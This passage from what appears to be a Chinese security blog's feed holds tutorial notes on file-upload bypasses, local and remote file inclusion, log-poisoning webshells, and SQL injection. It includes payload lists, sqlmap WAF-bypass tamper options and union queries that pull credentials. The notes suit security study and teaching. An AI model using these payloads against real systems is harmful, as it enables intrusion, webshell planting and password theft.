start="4"><li>目录验证</li></ol><p>上传文件的表单，上传目录可控。</p><ol start="5"><li>截断上传攻击。</li></ol><p><code>Nginx &lt;8.03</code> 空字节代码执行漏洞</p><p>常见的截断字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\0</span><br><span class="line">?</span><br><span class="line">%00</span><br></pre></td></tr></table></figure><ol start="6"><li>其他</li></ol><p>如果在<code>Apache</code>中<code>.htaccess</code>可被执行.且可被上传.那可以尝试在<code>.htaccess</code>中写入: <code>&lt;FilesMatch &quot;wooyun.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code>,然后再上传<code>shell.jpg</code>的木马, 这样<code>shell.jpg</code>就可解析为php文件。</p><h2 id="文本编辑器上传漏洞"><a href="#文本编辑器上传漏洞" class="headerlink" title="文本编辑器上传漏洞"></a>文本编辑器上传漏洞</h2><p>常见文本编辑器的漏洞</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul><li>目录过滤不严，攻击者建立畸形目录</li><li>文件为重命名，攻击者利用解析漏洞</li></ul><p>此图来自下面的paper，在红点出进行代码修复，基本上可以修复大部分的上传攻击漏洞。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513328582869.jpg" alt="enter description here"></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>上传攻击总结.pdf,这篇paper针对上传攻击，很详细：</p><p>链接：<a href="https://pan.baidu.com/s/1o8DqwXG" target="_blank" rel="noopener">https://pan.baidu.com/s/1o8DqwXG</a> 密码：v5lb</p><p><a href="https://alpha.wallhaven.cc/" target="_blank" rel="noopener">首页图来自wallhaven.cc</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/6b695b58a8c141161d5b9d9c39259579_r.jpg&quot; alt=&quot;enter description here&quot; title=&quot;文件上传&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="阅读" scheme="http://airs-sec.com/categories/%E9%98%85%E8%AF%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="http://airs-sec.com/2017/12/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://airs-sec.com/2017/12/14/文件包含/</id>
    <published>2017-12-14T09:10:46.000Z</published>
    <updated>2017-12-14T11:01:14.864Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/a827b051f81986182370076c4aed2e738ad4e6db.jpg" alt="1" title="1"></p><p>在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><a id="more"></a><h2 id="0x01-本地文件包含"><a href="#0x01-本地文件包含" class="headerlink" title="0x01 本地文件包含"></a>0x01 本地文件包含</h2><blockquote><p>当被包含的文件在服务器本地时，就形成本地文件包含</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type of call:</span><br><span class="line">    require($_GET[file]);</span><br><span class="line">Exploit:</span><br><span class="line">    http://host/?file=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-29_11-40-51.png" alt="2" title="2"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type of call:</span><br><span class="line">    require(&quot;includes/&quot;.$_GET[file]);</span><br><span class="line">Exploit:</span><br><span class="line">    http://host/?file=../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-29_13-05-59.png" alt="3" title="3"></p><h2 id="0x02-远程文件包含"><a href="#0x02-远程文件包含" class="headerlink" title="0x02 远程文件包含"></a>0x02 远程文件包含</h2><blockquote><p>当被包含的文件在第三方服务器时，叫做远程文件包含</p></blockquote><p><strong>需要：</strong> <code>php.ini</code> <code>allow_url_fopen on</code> <code>allow_url_include on</code></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-29_13-06-27.png" alt="4" title="4"></p><p><code>http://localhost/dvwa/vulnerabilities/fi/?page=http://104.128.225.49:8080/test.php</code></p><h2 id="0x03包含日志文件getshell（需要一定读权限-且需要知道日志文件路径）"><a href="#0x03包含日志文件getshell（需要一定读权限-且需要知道日志文件路径）" class="headerlink" title="0x03包含日志文件getshell（需要一定读权限,且需要知道日志文件路径）"></a>0x03包含日志文件getshell（需要一定读权限,且需要知道日志文件路径）</h2><blockquote><p>包含日志文件主要的原理是利用apache的错误日志文件，当访问一个不存在的页面，且在页面后面加恶意代码，可以将这段代码写入到error.log文件中去，之后通过远程文件包含，将日志文件包含出来。。</p></blockquote><p>如漏洞文件为：<code>http://xxx.com/lfi.php?page=xxx</code></p><p><code>http://xxx.com/lfi.php?page=/etc/httpd/conf/httpd.conf</code></p><p>通过<code>/etc/httpd/conf/httpd.conf</code> 查看错误日志文件位置为<code>error.log</code></p><p>（1）包含一句话</p><p>随便访问：<code>http://xxx.com/xxx.php&lt;?php eval($_POST[&#39;a&#39;]); ?&gt;</code></p><blockquote><p>写入日志,查看日志</p></blockquote><p><code>http://xxx.com/lfi.php?page=error.log</code></p><p>注：会被编码，需burp截包，repeate改编码。（红黑联盟视频渗透测试17课）       </p><p>（2）包含命令执行</p><p>随便访问：<code>http://xxx.com/xxx.php&lt;?php system(‘ls -al /var/www/’)&gt;</code></p><p>写入日志，查看日志</p><p><code>http://xxx.com/lfi.php?page=error.log</code></p><h2 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h2><blockquote><p>对引入文件包含的参数进行过滤，或者对所引入的文件的域进行限制，禁止服务器访问可信域以外的文件。</p></blockquote><p><a href="https://superkieran.github.io/WooyunDrops/#!/drops/396.PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93" target="_blank" rel="noopener">参考-PHP文件包含漏洞总结</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/a827b051f81986182370076c4aed2e738ad4e6db.jpg&quot; alt=&quot;1&quot; title=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。&lt;/p&gt;
    
    </summary>
    
      <category term="学习" scheme="http://airs-sec.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>web安全深度剖析</title>
    <link href="http://airs-sec.com/2017/12/14/web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/"/>
    <id>http://airs-sec.com/2017/12/14/web安全深度剖析/</id>
    <published>2017-12-14T03:14:28.000Z</published>
    <updated>2017-12-14T03:21:07.305Z</updated>
    
    <content type="html"><![CDATA[<p>web安全深度剖析这本书个人感觉很不错，很适合初学者，我之前也看过，做过笔记。</p><p>大家如果要看，可以在<code>分类-阅读</code>中找到。</p><p>链接地址：</p><p>链接：<a href="https://pan.baidu.com/s/1jHNrCEE" target="_blank" rel="noopener">https://pan.baidu.com/s/1jHNrCEE</a> 密码：1oo4</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;web安全深度剖析这本书个人感觉很不错，很适合初学者，我之前也看过，做过笔记。&lt;/p&gt;
&lt;p&gt;大家如果要看，可以在&lt;code&gt;分类-阅读&lt;/code&gt;中找到。&lt;/p&gt;
&lt;p&gt;链接地址：&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&quot;https://pan.baidu.com/s/1
      
    
    </summary>
    
      <category term="书籍分享" scheme="http://airs-sec.com/categories/%E4%B9%A6%E7%B1%8D%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="书籍" scheme="http://airs-sec.com/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>web安全深度剖析-第五章-sql注入漏洞</title>
    <link href="http://airs-sec.com/2017/12/13/web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90-%E7%AC%AC%E4%BA%94%E7%AB%A0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://airs-sec.com/2017/12/13/web安全深度剖析-第五章-sql注入漏洞/</id>
    <published>2017-12-13T08:47:24.000Z</published>
    <updated>2017-12-14T04:56:05.631Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513155397482.jpg" alt="..."></p><a id="more"></a><h2 id="0x01-sql注入漏洞的原理"><a href="#0x01-sql注入漏洞的原理" class="headerlink" title="0x01 sql注入漏洞的原理"></a>0x01 sql注入漏洞的原理</h2><p>当应用程序（如php）要通过数据库（mysql）<code>增删改查</code>数据时，如果在应用程序设计时，操作数据库<code>增删改查</code>的语句存在缺陷（未过滤特殊字符），攻击者可构造特殊的sql语句，达到非法操作数据库的目的。</p><p><strong>用户输入的数据被sql解释器执行。</strong></p><h2 id="0x02-注入分类"><a href="#0x02-注入分类" class="headerlink" title="0x02 注入分类"></a>0x02 注入分类</h2><ul><li>数字型注入</li></ul><p><code>http://xxx.com/product.php?id=1</code></p><p>查询语句<br>    <code>select * from product where id = 1</code></p><blockquote><p>for example：</p></blockquote><p>存在下列语句：</p><p><strong>原始数据库语句</strong></p><p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;</code></p><p><strong>用户输入数据后的语句</strong></p><p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39;;</code></p><p><strong>漏洞利用语句：</strong></p><p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39; and 1=2 --1&#39;;</code></p><p>输出报错，存在sql注入</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-27_11-00-47.png" alt="sql error" title="sql error"></p><ul><li>字符型注入</li></ul><p><code>http://xxx.com/product.php?str=&#39;apple&#39;</code></p><p>查询语句<br>    <code>select * from product where str = &#39;apple&#39;</code></p><p><code>product.php?</code>中<code>?</code>后面接的是带入数据库的参数。</p><hr><p><strong>判断</strong></p><p>1、<code>apple&#39; and &#39;1&#39;=&#39;2</code></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-27_11-00-47.png" alt="enter description here" title="sql char error"></p><p>2、<code>apple&#39;%2B&#39;</code></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-27_11-27-16.png" alt="enter description here" title="sql char error"></p><ul><li>其他注入类型</li></ul><p><strong>POST注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /dvwa/login.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost/dvwa/login.php</span><br><span class="line">Cookie: security=impossible; PHPSESSID=t8pr1juco934q8av7sqi5g7cj3</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 88</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=password&amp;Login=Login&amp;user_token=8a0a745a43a7cd4e34d1ce0802320078</span><br></pre></td></tr></table></figure><p>POST和GET类型的区别</p><p>通过FORM表单提交的数据，一般使用的是POST数据提交，POST提交的数据长度比GET型长，同时，在数据安全方面，POST占有优势。而GET提交的数据在URL中明文传送。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /dvwa/vulnerabilities/sqli/ HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost/dvwa/index.php</span><br><span class="line">Cookie: security=impossible; PHPSESSID=t8pr1juco934q8av7sqi5g7cj3</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure><p><strong>COOKIE注入</strong></p><p>COOKIE是一种身份凭证，在浏览器和服务器通信的过程中，由于HTTP是无状态协议，所以每次通信都得去认证身份，你想象下，如果在购买东西的时候，没有身份凭证的话，添加一件商品，用户的当前登录状态就会消失，这样就好麻烦了。</p><p>COOKIE存储在用户的浏览器中，当用户通过浏览器访问服务器时，带着这个COOKIE（令牌），服务器通过对比发现，这个COOKIE是这个用户的，就会记录登录状态，访问其他的页面时，都是带着这个COOKIE，用户的状态就会处在标识当中。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/12.png" alt="enter description here" title="COOKIE"></p><p><strong>延时注入</strong></p><p><strong>搜索型注入</strong></p><p><a href="http://airs-sec.com/2017/02/09/%25E6%2590%259C%25E7%25B4%25A2%25E5%259E%258B%25E6%25B3%25A8%25E5%2585%25A5%25E5%2588%25A9%25E7%2594%25A8%25E6%2596%25B9%25E6%25B3%2595/">传送门</a></p><p><strong>base64注入</strong></p><h2 id="0x03注入判断"><a href="#0x03注入判断" class="headerlink" title="0x03注入判断"></a>0x03注入判断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">or 1=1</span><br><span class="line"></span><br><span class="line">or 1=2</span><br><span class="line"></span><br><span class="line">and 1=1 数字型</span><br><span class="line"></span><br><span class="line">&apos; and &apos;1&apos;=&apos;1 字符型</span><br><span class="line"></span><br><span class="line">) and (1=1   </span><br><span class="line"></span><br><span class="line">&apos;) and (&apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">%&apos; and &apos;%&apos;=&apos; 搜索型</span><br><span class="line"></span><br><span class="line">%&apos; and 1=(select 1 from dual) and &apos;%&apos;=&apos;    //mysql 和 oracle 中存在dual虚拟表</span><br><span class="line"></span><br><span class="line">case when 1=1 then 条件1 else 条件2 end   //如果条件成立（1=1）  返回条件1 否则返回条件2</span><br><span class="line"></span><br><span class="line">&apos; and 1=(select case when 1=1 then 1 else 2 end) and &apos;1&apos;=&apos;1   </span><br><span class="line"></span><br><span class="line">&apos; and 1=1 and &apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">&apos; and 1=2 and &apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">&apos; and 1 like 1 and &apos;1&apos; like &apos;1</span><br><span class="line"></span><br><span class="line">&apos; and 1 like 2 and &apos;1&apos; like &apos;1</span><br><span class="line"></span><br><span class="line">&apos; ||</span><br><span class="line"></span><br><span class="line">AND SLEEP(5)</span><br><span class="line"></span><br><span class="line">%&apos; and sleep(5) and &apos;%&apos;=&apos;</span><br><span class="line"></span><br><span class="line">||    =   or</span><br><span class="line"></span><br><span class="line">&amp;&amp;   =   and</span><br><span class="line"></span><br><span class="line">and 2&gt;1  </span><br><span class="line"></span><br><span class="line">and 2&lt;1</span><br><span class="line"></span><br><span class="line">%0a</span><br><span class="line"></span><br><span class="line">&apos; union%a0select version()</span><br><span class="line"></span><br><span class="line">bypass.php?id=xxoo&apos;%2b100.union select flag from flag.flag%23</span><br><span class="line"></span><br><span class="line">index.php?name= and 1=.1union select flag from flag limit 0,1%23\</span><br><span class="line"></span><br><span class="line">%0c = form feed, new page</span><br><span class="line"></span><br><span class="line">%09 = horizontal tab</span><br><span class="line"></span><br><span class="line">%0d = carriage return</span><br><span class="line"></span><br><span class="line">%0a = line feed, new line</span><br><span class="line"></span><br><span class="line">**%&apos; an%00d 1=1 an%00d &apos;%&apos;=&apos;**</span><br><span class="line"></span><br><span class="line">宽字节： %df&apos;</span><br><span class="line"></span><br><span class="line">and 1 in (1)</span><br><span class="line"></span><br><span class="line">and 1 in (2)</span><br></pre></td></tr></table></figure><h2 id="0x04注入工具"><a href="#0x04注入工具" class="headerlink" title="0x04注入工具"></a>0x04注入工具</h2><p>sqlmap</p><p><a href="http://airs-sec.com/2017/02/09/%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">传送门</a></p><p><strong>补充：</strong></p><p>针对伪静态：</p><p><code>sqlmap -u http://xxx.com/id/2*.html --dbs</code></p><p>针对POST注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /dvwa/login.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost/dvwa/login.php</span><br><span class="line">Cookie: security=impossible; PHPSESSID=t8pr1juco934q8av7sqi5g7cj3</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 88</span><br><span class="line"></span><br><span class="line">username=admin*&amp;password=password&amp;Login=Login&amp;user_token=8a0a745a43a7cd4e34d1ce0802320078</span><br></pre></td></tr></table></figure><p>绕过waf的tamper脚本：</p><blockquote><p>要测试mysql，可以使用以下所有tamper脚步：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,</span><br><span class="line">greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,</span><br><span class="line">multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,</span><br><span class="line">space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,</span><br><span class="line">versionedmorekeywords,xforwardedfor</span><br></pre></td></tr></table></figure><blockquote><p>要测试mssql，您可以使用以下所有tamper脚本：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes</span><br></pre></td></tr></table></figure><blockquote><p>下面是支持mssql和mysql的tamper脚步列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,</span><br><span class="line">charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,</span><br><span class="line">percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p></blockquote><p><a href="https://securityonline.info/sql-injection-bypass-waf-using-tamper-script-sqlmap/" target="_blank" rel="noopener">来源</a></p><p>sqlmap脑图：链接：<a href="http://pan.baidu.com/s/1mhYbRDI" target="_blank" rel="noopener">http://pan.baidu.com/s/1mhYbRDI</a> 密码：9z2f</p><p><strong>个人常用选项：</strong></p><p>sqlmap -u “<a href="http://xxx.com/xxx.php?id=1&quot;" target="_blank" rel="noopener">http://xxx.com/xxx.php?id=1&quot;</a> –level 3 –random-agent –risk 3 –dbs</p><h2 id="0x05防止sql注入"><a href="#0x05防止sql注入" class="headerlink" title="0x05防止sql注入"></a>0x05防止sql注入</h2><ul><li>严格的数据类型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">$sql = &quot;select * from news where id = $id&quot;;</span><br><span class="line">$news = exec($sql);</span><br></pre></td></tr></table></figure><p>对id进行判断，过滤</p><p>1、通过mysql_real_escape_string( )函数进行过滤。mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。</p><pre><code>`$id = mysql_real_escape_string( $id );`</code></pre><p>2、is_numeric()函数判断输入的是否为数字。</p><ul><li>特殊字符转义</li></ul><p>OWASP ESAPI</p><p><strong>二次注入攻击:</strong></p><p>在开启转义之后，特殊字符被转移了，但在数据库存储中并未转义，当另一个地方引用时，则会有一次诱发sql注入攻击。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">insert</span> <span class="keyword">into</span> message(<span class="keyword">id</span>,title,<span class="keyword">content</span>) <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">"$title"</span>,<span class="string">"$content"</span>)<span class="string">";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># sql语句如下</span></span><br><span class="line"><span class="string">insert into message(id,title,content) values (3,'secbug\'','secbug')</span></span><br></pre></td></tr></table></figure><hr><table><thead><tr><th>id</th><th>title</th><th>content</th></tr></thead><tbody><tr><td>3</td><td>secbug’</td><td>secbug.org</td></tr></tbody></table><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> message <span class="keyword">where</span> title = <span class="string">'$title'</span></span><br></pre></td></tr></table></figure><p><strong>利用语句</strong></p><p><code>$title = &#39; union select 1,@@version 3 --</code></p><ul><li><p>使用预编译语句</p><ul><li>将sql语句预先编译后再执行。</li></ul></li><li><p>框架技术</p><ul><li>利用集成的框架进行应用程序的开发工作。</li></ul></li><li><p>存储过程</p><ul><li>为了完成特定功能或经常使用的SQL语句集，经编译后存储在数据库中。</li></ul></li></ul><h2 id="0x06其他"><a href="#0x06其他" class="headerlink" title="0x06其他"></a>0x06其他</h2><p><strong>手工注入</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> order by <span class="number">6</span> <span class="comment">//判断字段数 </span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="comment">//找出回显位 </span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,user(),database(),<span class="number">5</span>,<span class="number">6</span> <span class="comment">//简单获取一些系统信息</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> from information_schema.tables where table.schema=<span class="number">16</span>进制的当前数据库 <span class="comment">//获取表名</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> from information_schema.columns where table_name=<span class="number">16</span>进制的表名 <span class="comment">//获取字段名 </span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(username,<span class="number">0x3a</span>,password),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> from 表名 <span class="comment">//获取字段内容</span></span><br></pre></td></tr></table></figure><p>附常用敏感函数：</p><p><code>user()</code>,<code>database()</code>,<code>@@basedir</code>,<code>@@tmpdir</code>,<code>version()</code>,<code>@@datadir</code>,</p><p><code>@@general_log_file</code>,<code>@@hostname</code>,<code>@@plugin_dir</code>,<code>@@port</code>,<code>@@global.version_compile_os</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table.schema=<span class="number">0</span>xxxx  //获取表</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0</span>xxxxx  //获取字段</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>) <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure><p><strong>报错注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`select * from ad where id=1` `and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);`</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-28_15-41-50.png" alt="enter description here" title="sql查询错误"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/1513155397482.jpg&quot; alt=&quot;...&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="阅读" scheme="http://airs-sec.com/categories/%E9%98%85%E8%AF%BB/"/>
    
    
      <category term="web安全" scheme="http://airs-sec.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>linux周期性进程（任务计划）</title>
